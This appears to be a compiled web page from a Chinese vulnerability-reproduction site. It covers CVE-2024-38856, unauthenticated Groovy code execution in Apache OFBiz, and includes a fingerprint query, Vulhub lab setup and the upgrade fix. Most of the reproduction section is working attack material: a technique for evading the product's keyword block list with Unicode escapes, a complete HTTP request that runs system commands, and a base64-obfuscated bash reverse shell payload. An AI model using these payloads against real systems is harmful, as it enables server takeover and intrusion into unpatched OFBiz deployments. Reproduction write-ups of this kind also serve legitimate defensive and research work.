import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as d,c as s,a as e,b as a,d as n,e as l}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),u=e("p",null,"Apache OFBiz 是一个开源的企业资源规划（ERP）系统。它提供了一套企业应用程序，用于集成和自动化企业的许多业务流程。",-1),p=e("p",null,"这个漏洞是由于对 CVE-2023-51467 的不完全修复而产生的。在 Apache OFBiz 18.12.11 版本中，开发人员认为他们已经修复了该漏洞，但实际上他们只解决了其中一种利用方法。Groovy 表达式注入仍然存在，允许未经授权的用户在服务器上执行任意命令。",-1),h=e("p",null,"参考链接：",-1),m={href:"https://github.com/apache/ofbiz-framework/commit/31d8d7",target:"_blank",rel:"noopener noreferrer"},b={href:"https://forum.butian.net/article/524",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/Praison001/CVE-2024-38856-ApacheOfBiz",target:"_blank",rel:"noopener noreferrer"},g={href:"https://issues.apache.org/jira/browse/OFBIZ-13128",target:"_blank",rel:"noopener noreferrer"},x=l(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache OFBiz &lt; 18.12.14
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Apache_OFBiz&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 Apache OfBiz 18.12.10 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在等待数分钟后，访问 <code>https://your-ip:8443/accounting</code> 查看到登录页面，说明环境已启动成功。</p><p>如果非本地 localhost 启动，Headers 需要包含 <code>Host: localhost</code>，否则报错：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ERROR MESSAGE
org.apache.ofbiz.webapp.control.RequestHandlerException: Domain your-ip not accepted to prevent host header injection. 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240918155911393.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>Apache Ofbiz 限制了如下一些关键词的使用，可以通过 Unicode 编码来绕过这个限制，比如 <code>\\u0065xecute</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>deniedWebShellTokens=java.,beans,freemarker,&lt;script,javascript,&lt;body,body ,&lt;form,&lt;jsp:,&lt;c:out,taglib,&lt;prefix,&lt;%@ page,&lt;?php,exec(,alert(,\\
                     %eval,@eval,eval(,runtime,import,passthru,shell_exec,assert,str_rot13,system,decode,include,page ,\\
                     chmod,mkdir,fopen,fclose,new file,upload,getfilename,download,getoutputstring,readfile,iframe,object,embed,onload,build,\\
                     python,perl ,/perl,ruby ,/ruby,process,function,class,InputStream,to_server,wget ,static,assign,webappPath,\\
                     ifconfig,route,crontab,netstat,uname ,hostname,iptables,whoami,&quot;cmd&quot;,*cmd|,+cmd|,=cmd|,localhost,thread,require,gzdeflate,\\
                     execute,println,calc,touch,calculate
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>直接发送如下请求即可使用 Groovy 脚本执行 <code>id</code> 命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /webtools/control/main/ProgramExport HTTP/1.1
Host: localhost:8443
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbR7sY3IIwQX7kcJ
Content-Length: 190

------WebKitFormBoundaryDbR7sY3IIwQX7kcJ
Content-Disposition: form-data; name=&quot;groovyProgram&quot;

throw new Exception(&#39;id&#39;.\\u0065xecute().text);
------WebKitFormBoundaryDbR7sY3IIwQX7kcJ--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240918160425061.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>reverse shell payload：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>throw new Exception(&#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}&#39;.\\u0065xecute().text);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><p>升级至 18.12.16 及以上版本。</p>`,21);function f(_,k){const i=r("ExternalLinkIcon");return d(),s("div",null,[c,u,p,h,e("ul",null,[e("li",null,[e("a",m,[a("https://github.com/apache/ofbiz-framework/commit/31d8d7"),n(i)])]),e("li",null,[e("a",b,[a("https://forum.butian.net/article/524"),n(i)])]),e("li",null,[e("a",v,[a("https://github.com/Praison001/CVE-2024-38856-ApacheOfBiz"),n(i)])]),e("li",null,[e("a",g,[a("https://issues.apache.org/jira/browse/OFBIZ-13128"),n(i)])])]),x])}const y=t(o,[["render",f],["__file","Apache OFBiz 身份验证绕过导致远程代码执行 CVE-2024-38856.html.vue"]]);export{y as default};
